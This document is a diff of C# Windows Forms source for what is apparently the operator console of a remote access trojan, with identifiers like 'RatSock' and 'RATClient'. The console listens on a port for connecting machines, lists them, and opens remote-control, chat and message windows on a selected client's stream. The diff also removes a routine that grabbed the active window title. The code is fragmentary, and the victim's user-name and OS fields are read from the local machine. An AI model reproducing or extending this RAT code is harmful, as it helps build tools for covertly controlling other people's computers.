@@ -20,17 +20,10 @@ namespace WindowsFormsApplication1
 {
     public partial class Main : RibbonForm
     {
-        [DllImport("user32.dll")]
-        static extern IntPtr GetForegroundWindow();
 
-        [DllImport("user32.dll")]
-        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
         TcpListener TCPListen;
         Thread PortListen;
-
-        // NetworkStream NS;
-        // StreamWriter SW;
-        // StreamReader SR;
         Socket RatSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         List<int> ItemIndexList = new List<int>();
         public NetworkStream[] NSArray = new NetworkStream[9999];
@@ -47,9 +40,6 @@ namespace WindowsFormsApplication1
         {
             listViewEx1.ResetHeaderHandler();
             Application.ThreadException += new ThreadExceptionEventHandler(Derped);
-            
-            //richTextBox1.Text = Text + "\n Listening on port 58899";
-
         }
 
         void Listen(int port)
@@ -64,17 +54,13 @@ namespace WindowsFormsApplication1
                     RatSock = TCPListen.AcceptSocket();
                     IPEndPoint TCPEndPoint = (IPEndPoint)RatSock.RemoteEndPoint;
                     Connected++;
-                     Invoke(new Action(() => label1.Text = "Connected: " + Connected));
-                    // Invoke(new Action(() => richTextBox1.Text = richTextBox1.Text + "\n Connection from " + IPAddress.Parse(TCPEndPoint.Address.ToString())));
-                    //richTextBox1.Text = richTextBox1.Text + "\n Connection from " + IPAddress.Parse(TCPEndPoint.Address.ToString());
+                    Invoke(new Action(() => label1.Text = "Connected: " + Connected));
                     ListViewItem Item = new ListViewItem(IDNum.ToString(), ItemIndex);
                     ItemIndexList.Add(ItemIndex);
                     Invoke(new Action(() => listViewEx1.Items.Add(Item)));
                     Invoke(new Action(() => Item.SubItems.Add(Environment.UserName)));
                     Invoke(new Action(() => Item.SubItems.Add(TCPEndPoint.Address.ToString())));
                     Invoke(new Action(() => Item.SubItems.Add(Environment.OSVersion.ToString())));
-                    //Item.SubItems.Add("Yes");
-                    //Item.SubItems.Add(GetActiveWindowTitle());
                     Thread RATClient = new Thread(() => Client(Item, IDNum));
                     RATClient.Start();
                     ItemIndex++;
@@ -97,8 +83,6 @@ namespace WindowsFormsApplication1
             StringBuilder Input = new StringBuilder();
             while (running)
             {
-                //MessageBox.Show(Item.ToString());
-
                 try
                 {
                     SR.ReadLine();
@@ -125,62 +109,84 @@ namespace WindowsFormsApplication1
             }
         }
 
-        private string GetActiveWindowTitle()
-        {
-            const int nChars = 256;
-            IntPtr handle = IntPtr.Zero;
-            StringBuilder Buff = new StringBuilder(nChars);
-            handle = GetForegroundWindow();
-
-            if (GetWindowText(handle, Buff, nChars) > 0)
-            {
-                return Buff.ToString();
-            }
-            return null;
-        }
-
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
             try
             {
-                //RatSock.Close();
-                //TCPListen.Stop();
+                RatSock.Close();
+                TCPListen.Stop();
             }
 
             catch { }
             Environment.Exit(0);
         }
 
-        private void button1_Click(object sender, EventArgs e)
+        private void switchButton1_ValueChanged(object sender, EventArgs e)
         {
-            //test = true;
+            if (switchButton1.Value == false)
+            {
+                //Turn off &
+                //Cleanup
+                IDNum = 1;
+                running = false;
+                TCPListen.Stop();
+                RatSock.Close();
+                listViewEx1.Items.Clear();
+                for (int i = 0; i < NSArray.Length; i++)
+                {
+                    NSArray[i] = null;
+                }
+
+                textBoxX1.Enabled = true;
+            }
+
+            else
+            {
+                //Enabled State
+                //PREPARIN TO FIRE MAH LAZER
+                textBoxX1.Enabled = false;
+                running = true;
+                PortListen = new Thread(() => Listen(Convert.ToInt32(textBoxX1.Text)));
+                PortListen.Start();
+            }
         }
 
-        private void listViewEx1_SelectedIndexChanged(object sender, EventArgs e)
+        private void buttonItem19_Click(object sender, EventArgs e)
         {
-            try
-            { }
-            catch { }
+            //MESSAGE FUNCTION
+            Message MessageWND = new Message();
+            MessageWND.ShowDialog();
         }
 
-        private void listViewEx1_MouseClick(object sender, MouseEventArgs e)
+        private void buttonItem34_Click(object sender, EventArgs e)
         {
-            try
-            { }
-            catch { }
+            Chat Chatbox = new Chat();
+            Chatbox.ShowDialog();
         }
 
-        private void Derped(object Obj, ThreadExceptionEventArgs Arg)
+        private void buttonItem32_Click(object sender, EventArgs e)
+        {
+            Remote Remote = new Remote(NSArray[Convert.ToInt32(listViewEx1.SelectedItems[0].Text)]);
+            Remote.ShowDialog();
+        }
+
+       private void Derped(object Obj, ThreadExceptionEventArgs Arg)
         {
             //Do this routine when program has dun goofd.
             listViewEx1.Items.Clear();
             RatSock.Blocking = true;
         }
 
-   
-        //IGNORE THE BS BELOW ME
 
-      private void metroTabItem2_Click(object sender, EventArgs e)
+       
+       
+ 
+
+
+
+
+        //IGNORE THE BS BELOW ME METRO UI STUFFFF
+         private void metroTabItem2_Click(object sender, EventArgs e)
         {
 
         }
@@ -210,20 +216,6 @@ namespace WindowsFormsApplication1
             Environment.Exit(0);
         }
 
-       // protected override void WndProc(ref Message m)
-       // {
-           // if (m.Msg == 0x0112) // WM_SYSCOMMAND
-           // {
-                // Check your window state here
-                //if (m.WParam == new IntPtr(0xF030)) // Maximize event - SC_MAXIMIZE from Winuser.h
-               // {
-                    // THe window is being maximized
-                    //MessageBox.Show("wat");
-               // }
-           // }
-            //base.WndProc(ref m);
-       // }
-
         private void metroShell1_Click_1(object sender, EventArgs e)
         {
 
@@ -234,53 +226,8 @@ namespace WindowsFormsApplication1
 
         }
 
-        private void switchButton1_ValueChanged(object sender, EventArgs e)
-        {
-            if (switchButton1.Value == false)
-            {
-                //Turn off &
-                //Cleanup
-                IDNum = 1;
-                running = false;
-                TCPListen.Stop();
-                RatSock.Close();
-                listViewEx1.Items.Clear();
-                for (int i = 0; i < NSArray.Length; i++)
-                {
-                    NSArray[i] = null;
-                }
-                
-                textBoxX1.Enabled = true;
-             }
 
-            else
-            {
-                //Enabled State
-                //PREPARIN TO FIRE MAH LAZER
-                textBoxX1.Enabled = false;
-                running = true;
-                PortListen = new Thread(() => Listen(Convert.ToInt32(textBoxX1.Text)));
-                PortListen.Start();
-            }
-        }
 
-        private void buttonItem19_Click(object sender, EventArgs e)
-        {
-            //MESSAGE FUNCTION
-            Message MessageWND = new Message();
-            MessageWND.ShowDialog();
-        }
 
-        private void buttonItem34_Click(object sender, EventArgs e)
-        {
-            Chat Chatbox = new Chat();
-            Chatbox.ShowDialog();
-        }
-
-        private void buttonItem32_Click(object sender, EventArgs e)
-        {
-           Remote Remote = new Remote(NSArray[Convert.ToInt32(listViewEx1.SelectedItems[0].Text)]);
-           Remote.ShowDialog();
-        }
     }
 }
